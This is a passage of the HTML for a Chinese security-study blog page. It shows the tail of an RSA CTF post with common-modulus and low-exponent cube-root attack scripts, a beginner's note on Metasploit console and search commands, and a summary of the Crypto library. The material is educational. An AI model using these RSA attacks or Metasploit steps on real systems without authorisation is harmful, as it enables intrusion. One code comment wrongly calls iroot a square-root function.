class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">  c1 = <span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">  c2 = <span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">  e1 = <span class="number">11187289</span></span><br><span class="line">  e2 = <span class="number">9647291</span></span><br><span class="line">  s = egcd(e1, e2)</span><br><span class="line">  s1 = s[<span class="number">1</span>]</span><br><span class="line">  s2 = s[<span class="number">2</span>]</span><br><span class="line">  <span class="comment"># 求模反元素</span></span><br><span class="line">  <span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line">  <span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">  m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line">  <span class="built_in">print</span> (libnum.n2s(m))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h4 id="低加密指数攻击："><a href="#低加密指数攻击：" class="headerlink" title="低加密指数攻击："></a>低加密指数攻击：</h4><p>所谓低加密指数指的就是e非常小的情况下，通常为3。<br>这种题目通常有两种类型，一种直接爆破，另外一种是低指数广播攻击。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = <span class="number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res=iroot(c+k*n,<span class="number">3</span>)   //iroot()，该函数的作用是计算一个数的整数平方根</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>]==<span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(res[<span class="number">0</span>])))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k=k+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">第二种写法</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">import gmpy2 </span></span><br><span class="line"><span class="string">from libnum import*</span></span><br><span class="line"><span class="string">n = 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span></span><br><span class="line"><span class="string">c = 0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">i = 0</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">    if(gmpy2.iroot(c+i*n,3)[1]==1):     #开根号</span></span><br><span class="line"><span class="string">        print(gmpy2.iroot(c+i*n,3))</span></span><br><span class="line"><span class="string">        break</span></span><br><span class="line"><span class="string">    i=i+1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/11/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="tyc的小窝">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/11/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">Metasploit渗透测试框架的基本使用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-06-11 22:21:08" itemprop="dateCreated datePublished" datetime="2023-06-11T22:21:08+08:00">2023-06-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-01-10 18:30:53" itemprop="dateModified" datetime="2025-01-10T18:30:53+08:00">2025-01-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="Metasploit渗透测试框架的基本使用"><a href="#Metasploit渗透测试框架的基本使用" class="headerlink" title="Metasploit渗透测试框架的基本使用"></a>Metasploit渗透测试框架的基本使用</h4><p>一.连接</p>
<p>1.打开数据库</p>
<p>​    systemctl start postgresql</p>
<p>​    systemctl enable postgresql #设置成开机启动数据库，我们要经常用</p>
<p>2.msf的打开</p>
<p>   msfconsole  （postgresql数据库和msf同时打开msfdb run）</p>
<p>3.连接：   connect ip（或域名) 端口(连接后get可以得到服务器版本号)</p>
<p>二.</p>
<p>1.show命令的使用</p>
<p>​    show的有效参数：all, encoders, nops, exploits, payloads, auxiliary, post,  plugins, info, options</p>
<p>三.search搜索的使用方法（search -h 列search命令的一些选项)</p>
<p>1.通过 name 关键字进行查找</p>
<p>​         search name:mysql   要查找 mysql 数据库的漏洞</p>
<p>2.通过路径进行查找</p>
<p>​          search path:mysql</p>
<p>​           path：命令查找在该路 径下的所有模块</p>
<p>3.缩小查询范围 </p>
<p>​        search platform:mysql</p>
<p>​         platform：列出可以影响此平台的模块，也就是比较好的漏洞 有时候我们会搜索到大量的模块，那么可以用 platform：命令来缩小查询范围。使用 platform 命 令后，所查询的结果会列出 rank 比较高的模块。如果我要查找 mysql 的漏洞</p>
<p>4.通过类型进行查找</p>
<p>​         search type:exploit</p>
<p>​          type : 特定类型的模块(exploit, payload, auxiliary, encoder, evasion, post, or nop) 要搜索 exploit 模块</p>
<h4 id="常见端口渗透"><a href="#常见端口渗透" class="headerlink" title="常见端口渗透"></a>常见端口渗透</h4><h5 id="1-ftp服务"><a href="#1-ftp服务" class="headerlink" title="1.ftp服务"></a>1.ftp服务</h5><p>(默认端口：20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）)</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/11/Crypto%E5%BA%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="tyc的小窝">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/11/Crypto%E5%BA%93/" class="post-title-link" itemprop="url">Crypto库</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-06-11 22:21:08" itemprop="dateCreated datePublished" datetime="2023-06-11T22:21:08+08:00">2023-06-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-01-10 18:37:43" itemprop="dateModified" datetime="2025-01-10T18:37:43+08:00">2025-01-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>#Crypto库</p>
<p>“Crypto”是一个强加密类库，它提供了多个加密算法和工具，可以用于保护数据的隐私和保密性。以下是Crypto库的一些常用模块和函数：</p>
<p>模块：</p>
<ul>
<li><code>Crypto.Cipher</code>：提供加密和解密算法的实现</li>
<li><code>Crypto.Hash</code>：提供哈希函数的实现</li>
<li><code>Crypto.Protocol</code>：提供安全协议相关的函数</li>
<li><code>Crypto.PublicKey</code>：提供公钥密码相关函数</li>
<li><code>Crypto.Random</code>：提供各种随机数生成器</li>
</ul>
<p>函数：</p>
<ul>
<li><code>AES.new(key, mode, IV)</code>：创建AES加密对象</li>
<li><code>RSA.generate(bits, e, progress_func=None)</code>：生成指定长度的RSA公钥和私钥</li>
<li><code>PKCS1_OAEP.new(key)</code>：基于RSA的公钥密码算法RSAES-OAEP的加解密对象</li>
<li><code>HMAC.new(key, msg, digestmod)</code>：创建HMAC对象</li>
<li><code>SHA256.new(data)</code>：计算SHA-256哈希值</li>
<li><code>get_random_bytes(n)</code>：生成n个字节长度的随机字节串</li>
<li><code>b64encode(s)</code>：将字符串进行base64编码</li>
</ul>
<p>其中，<code>Crypto.Cipher</code>、<code>Crypto.Hash</code>、<code>Crypto.Protocol</code>、<code>Crypto.PublicKey</code>和<code>Crypto.Random</code>等是Crypto库中常见的模块。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">John Doe</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">18</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
